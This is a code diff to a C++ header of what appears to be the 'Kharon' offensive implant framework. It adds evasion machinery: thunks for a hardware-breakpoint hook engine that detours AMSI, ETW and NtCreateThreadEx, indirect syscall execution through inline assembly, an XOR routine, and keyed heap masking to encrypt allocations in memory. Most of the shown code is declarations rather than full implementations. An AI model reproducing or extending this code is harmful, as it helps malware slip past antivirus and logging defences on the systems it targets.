@@ -674,12 +674,12 @@ public:
     ) -> BOOL;
 
     template<typename... Args>
-    auto DECLFN Run(
+    __forceinline auto DECLFN Run(
         _In_ ESYS_OPT Idx,
-        _In_ Args...  args
+        _In_ Args...  args        
     ) -> NTSTATUS {
         asm( "mov r14d, %0" : : "r"( Ext[Idx].ssn ) );
-        asm( "mov r15, %0" : : "r"( Ext[Idx].Instruction ) );
+        asm( "mov r15, %0" : : "r" ( Ext[Idx].Instruction ) );
     
         return ExecSyscall( args... );
     }
@@ -764,9 +764,24 @@ public:
         _In_ BOOL  TimerWait
     ) -> VOID;
 
+    __forceinline auto static DECLFN HookCallbackThunk(
+        _In_ PVOID Parameter,
+        _In_ BOOL  TimerWait,
+        _In_ PVOID This
+    ) -> VOID {
+        return static_cast<HwbpEng*>( This )->HookCallback( Parameter, TimerWait );
+    }
+
     auto MainHandler( 
         _In_ PEXCEPTION_POINTERS e 
     ) -> LONG;
+
+    __forceinline static auto MainThunk(
+        _In_ PEXCEPTION_POINTERS e,
+        _In_ PVOID               This
+    ) -> LONG {
+        return static_cast<HwbpEng*>( This )->MainHandler( e );
+    }
 
     auto AddNewThreads(
         _In_ INT8 Drx
@@ -780,6 +795,11 @@ public:
         _In_ PCONTEXT Ctx
     ) -> VOID;
 
+    static auto NtCreateThreadExHkThunk(
+        _In_ PCONTEXT Ctx,
+        _In_ PVOID    This 
+    ) -> VOID;
+
     auto DotnetInit( VOID ) -> BOOL;
     auto DotnetExit( VOID ) -> BOOL;
 
@@ -790,6 +810,16 @@ public:
     auto AmsiDetour(
         _In_ PCONTEXT Ctx
     ) -> VOID;    
+
+    static auto EtwThunk(
+        _In_ PCONTEXT Ctx,
+        _In_ PVOID    This 
+    ) -> VOID;
+
+    static auto AmsiThunk(
+        _In_ PCONTEXT Ctx,
+        _In_ PVOID    This 
+    ) -> VOID;
 };
 
 class Jobs {
@@ -896,6 +926,13 @@ private:
     Root::Kharon* Self;
 public:
     Useful( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
+
+    auto Xor( 
+        _In_opt_ PBYTE  Bin, 
+        _In_     SIZE_T BinSize, 
+        _In_     PBYTE  Key, 
+        _In_     SIZE_T KeySize 
+    ) -> VOID;
 
     auto NtStatusToError(
         _In_ NTSTATUS NtStatus
@@ -1364,24 +1401,37 @@ public:
     ) -> BOOL;
 };
 
+typedef struct _HEAP_NODE {
+    PVOID Block;
+    ULONG Size;
+    struct _HEAP_NODE* Next;
+} HEAP_NODE, *PHEAP_NODE;
+
 class Heap {
 private:
     Root::Kharon* Self;
 public:
     Heap( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
 
-    auto DECLFN Alloc(
+    PHEAP_NODE Node = nullptr;
+    ULONG Count     = 0;
+
+    BYTE  Key[16]   = { 0 };
+    BOOL  Obfuscate = KH_HEAP_MASK;
+
+    auto Crypt( VOID ) -> VOID;
+
+    auto Alloc(
         _In_ ULONG Size
     ) -> PVOID;
     
-    auto DECLFN ReAlloc(
+    auto ReAlloc(
         _In_ PVOID Block,
         _In_ ULONG Size
     ) -> PVOID;
     
-    auto DECLFN Free(
-        _In_ PVOID Block,
-        _In_ ULONG Size
+    auto Free(
+        _In_ PVOID Block
     ) -> BOOL;
 };
 
@@ -1545,7 +1595,7 @@ private:
 public:
     DECLFN ProcThreadAttrList() : AttrBuff( 0 ), AttrSize( 0 ) {}
 
-    auto DECLFN Initialize(
+    __forceinline auto DECLFN Initialize(
         _In_ UINT8 UpdateCount
     ) -> BOOL {
         INT3BRK
